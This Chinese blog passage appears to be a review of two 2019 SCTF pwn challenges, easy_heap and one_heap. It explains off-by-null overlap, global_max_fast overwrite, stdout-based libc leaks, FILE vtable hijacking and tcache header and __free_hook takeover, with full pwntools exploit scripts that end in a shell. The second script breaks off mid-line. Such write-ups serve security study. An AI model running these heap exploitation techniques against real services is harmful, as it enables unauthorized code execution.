        <content type="html"><![CDATA[<p>[toc]</p><h1 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h1><h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/2019-sctf-bu-fen-pwn-ti-fu-pan/0.png"></div>2.23 io attackio leakoff by null## IDA分析(1).创建：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/2019-sctf-bu-fen-pwn-ti-fu-pan/1.png"></div><p>（2）delete</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/2019-sctf-bu-fen-pwn-ti-fu-pan/2.png"></div><p>（3）edit</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/2019-sctf-bu-fen-pwn-ti-fu-pan/3.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/2019-sctf-bu-fen-pwn-ti-fu-pan/4.png"></div>off by null<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li>利用off by null先进行overlapping，达到heap空间复用的情况。</li><li>修改global_max_fastbin的限制，使unsorted  bin也可以有fastbin attack的攻击效果</li><li>分配到stdout相应的位置，覆写read_base和flag来泄露libc地址</li><li>hijacking iofile中overflow的函数来getshell</li></ol><h2 id="详细步骤"><a href="#详细步骤" class="headerlink" title="详细步骤"></a>详细步骤</h2><p>步骤一：off by null进行overlapping（此时：chunk 4可以覆盖到chunk 2的内容，可以进行unsorted bin  attack等等）</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># using off by null make overlapping, modify</span>create<span class="token punctuation">(</span><span class="token number">0xe8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># create 0</span>create<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># create 1</span>create<span class="token punctuation">(</span><span class="token number">0xe0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># create 2</span>create<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># create 3</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x1f0</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># del 1</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0xe8</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># create 1</span>create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># create 4 *****</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># del 1</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># del 2</span>create<span class="token punctuation">(</span><span class="token number">0x120</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># create 1</span>create<span class="token punctuation">(</span><span class="token number">0xe0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># create 2 ******</span>create<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># create 5</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>步骤二：修改global_max_fastbin</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># there have a big point</span>global_max_fast <span class="token operator">=</span> <span class="token number">0x37f8</span><span class="token comment" spellcheck="true"># modify global_max_fastbin</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x08</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span><span class="token number">0x37f8</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0xe0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># create 2</span><span class="token comment" spellcheck="true"># edit(2,p64(0)*4)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>步骤三：利用stdout打印libc_base</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># using fastbin attack</span>offset_maxFast_stdout <span class="token operator">=</span> <span class="token number">0x11d8</span> <span class="token comment" spellcheck="true"># max_fast_bin - stdout</span>target_address <span class="token operator">=</span> global_max_fast<span class="token operator">-</span> offset_maxFast_stdout <span class="token operator">-</span> <span class="token number">0x51</span> <span class="token comment" spellcheck="true"># 找到的size合适的地址</span>stdout_addr_last4 <span class="token operator">=</span> global_max_fast<span class="token operator">-</span> offset_maxFast_stdout<span class="token keyword">print</span> hex<span class="token punctuation">(</span>target_address<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x08</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span>target_address<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0xe0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># create 2</span>create<span class="token punctuation">(</span><span class="token number">0xe0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># create 6</span>fake_stdout <span class="token operator">=</span> <span class="token string">"0"</span>fake_stdout<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x40</span>fake_stdout<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span>fake_stdout<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>fake_stdout<span class="token operator">+=</span> p16<span class="token punctuation">(</span>stdout_addr_last4<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># io_write_base指向自己，才能把地址打印出来</span>edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>fake_stdout<span class="token punctuation">)</span>stdout_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x20</span>libc_base <span class="token operator">=</span> stdout_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"stdout"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>步骤四：hijaking  io_file</p><pre class="line-numbers language-python"><code class="language-python">one_gadget <span class="token operator">=</span> <span class="token number">0xf02a4</span> <span class="token operator">+</span> libc_basefake_stderr <span class="token operator">=</span> <span class="token string">"0"</span>fake_stderr<span class="token operator">+=</span> p64<span class="token punctuation">(</span>stdout_addr<span class="token number">-0x40</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># fp->wide_data(struct)</span>fake_stderr<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 相当于是把wide_date结构体指向本身，只关注需要的变量，同时</span><span class="token comment" spellcheck="true"># 数据复用，这部分既是io_file结构体的成员也是wide_date的成员</span>fake_stderr<span class="token operator">+=</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># hajicking overflow</span>fake_stderr<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>fake_stderr<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>fake_stderr<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">16</span>fake_stderr<span class="token operator">+=</span> p64<span class="token punctuation">(</span>stdout_addr<span class="token number">-0x48</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># fd->vtable</span>edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>fake_stderr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python2</span><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./easy_heap"</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./easy_heap"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># using off by null make overlapping, modify</span>create<span class="token punctuation">(</span><span class="token number">0xe8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># create 0</span>create<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># create 1</span>create<span class="token punctuation">(</span><span class="token number">0xe0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># create 2</span>create<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># create 3</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x1f0</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># del 1</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0xe8</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># create 1</span>create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># create 4 *****</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># del 1</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># del 2</span>create<span class="token punctuation">(</span><span class="token number">0x120</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># create 1</span>create<span class="token punctuation">(</span><span class="token number">0xe0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># create 2 ******</span>create<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># create 5</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># there have a big point</span>global_max_fast <span class="token operator">=</span> <span class="token number">0x37f8</span><span class="token comment" spellcheck="true"># modify global_max_fastbin</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x08</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span><span class="token number">0x37f8</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0xe0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># create 2</span><span class="token comment" spellcheck="true"># edit(2,p64(0)*4)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># using fastbin attack</span>offset_maxFast_stdout <span class="token operator">=</span> <span class="token number">0x11d8</span> <span class="token comment" spellcheck="true"># max_fast_bin - stdout</span>target_address <span class="token operator">=</span> global_max_fast<span class="token operator">-</span> offset_maxFast_stdout <span class="token operator">-</span> <span class="token number">0x51</span> <span class="token comment" spellcheck="true"># 找到的size合适的地址</span>stdout_addr_last4 <span class="token operator">=</span> global_max_fast<span class="token operator">-</span> offset_maxFast_stdout<span class="token keyword">print</span> hex<span class="token punctuation">(</span>target_address<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x08</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span>target_address<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0xe0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># create 2</span>create<span class="token punctuation">(</span><span class="token number">0xe0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># create 6</span>fake_stdout <span class="token operator">=</span> <span class="token string">"0"</span>fake_stdout<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x40</span>fake_stdout<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span>fake_stdout<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>fake_stdout<span class="token operator">+=</span> p16<span class="token punctuation">(</span>stdout_addr_last4<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># io_write_base指向自己，才能把地址打印出来</span>edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>fake_stdout<span class="token punctuation">)</span>stdout_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x20</span>libc_base <span class="token operator">=</span> stdout_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"stdout"</span><span class="token punctuation">]</span>one_gadget <span class="token operator">=</span> <span class="token number">0xf02a4</span> <span class="token operator">+</span> libc_basefake_stderr <span class="token operator">=</span> <span class="token string">"0"</span>fake_stderr<span class="token operator">+=</span> p64<span class="token punctuation">(</span>stdout_addr<span class="token number">-0x40</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># fp->wide_data(struct)</span>fake_stderr<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 相当于是把wide_date结构体指向本身，只关注需要的变量，同时</span><span class="token comment" spellcheck="true"># 数据复用，这部分既是io_file结构体的成员也是wide_date的成员</span>fake_stderr<span class="token operator">+=</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># hajicking overflow</span>fake_stderr<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>fake_stderr<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>fake_stderr<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">16</span>fake_stderr<span class="token operator">+=</span> p64<span class="token punctuation">(</span>stdout_addr<span class="token number">-0x48</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># fd->vtable</span>edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>fake_stderr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>stdout_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="one-heap"><a href="#one-heap" class="headerlink" title="one_heap"></a>one_heap</h1><h2 id="查看文件-1"><a href="#查看文件-1" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/2019-sctf-bu-fen-pwn-ti-fu-pan/5.png"></div><p>2.27 hijacking tcache header </p><h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>删除：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/2019-sctf-bu-fen-pwn-ti-fu-pan/6.png"></div>double free<p>创建：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/2019-sctf-bu-fen-pwn-ti-fu-pan/7.png"></div><p>读取函数测试了半天也没什么问题：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/2019-sctf-bu-fen-pwn-ti-fu-pan/8.png"></div><p>总结一下条件：<br>1.规定释放次数不大于4<br>2.malloc次数不大于0xf<br>3.ptr保留在bss端上<br>4.chunk大小不大于0x7f</p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>按照往常思路：首先需要leak libc，没有打印函数那么就需要hijacking stdout，需要fastbin attack。但是这里限制释放次数4，那么肯定走不通，同样的想利用unsorted bin attack之类的以往常思路也走不通。</p><p>通过学习别人的exp了解到tcache还有一种攻击方式就是：control tcache header。这里简单先说明此题所需要的原理：tcache前面的内容全部是代表每个tcache list中chunk的个数。如果我们可以劫持header修改其参数，那么我们就可以释放到原本的unsorted bin或者其他bin中。</p><p>那么如何劫持呢：这里需要爆破。首先double free之后chunk会指向main arean地址，那么我们进行爆破一下就可以分配到header了，之后分配chunk修改参数将所有tcache链都full掉。之后删除这个chunk就会进入unsorted bin。这时在进行io_file attack来泄露libc base。最后再利用一次double free的漏洞进行hijacking hook。</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>步骤一：控制header：（这里需要注意：1.0x40的number表示参数。2.需要注意其堆分布情况，要注意由于free有限需要令后面的chunk不能太大，要在0x80以内，难点）</p><pre class="line-numbers language-python"><code class="language-python">create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1</span>delete<span class="token punctuation">(</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"\x10\x70"</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'\xff'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token string">'\xff'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">"\x60\x07\xdd"</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 大的size不能滿足後面的double free時的題目size限制範圍</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如图：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/2019-sctf-bu-fen-pwn-ti-fu-pan/9.png"></div>黑框是以后需要hijacking hook时利用的。<p>步骤二：leak libc base：（这里就一点：18版本stdout和_IO_2_1_stdout_大小不同）</p><pre class="line-numbers language-python"><code class="language-python">create<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token string">"\x80"</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>data <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>data<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> data <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"_IO_2_1_stdout_"</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>步骤三：hijacking hook：</p><pre class="line-numbers language-python"><code class="language-python">one_gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2c5</span><span class="token punctuation">,</span><span class="token number">0x4f322</span><span class="token punctuation">,</span><span class="token number">0x10a38c</span><span class="token punctuation">]</span>one_gadget <span class="token operator">=</span> one_gadgets<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_basefree_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># decoding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token 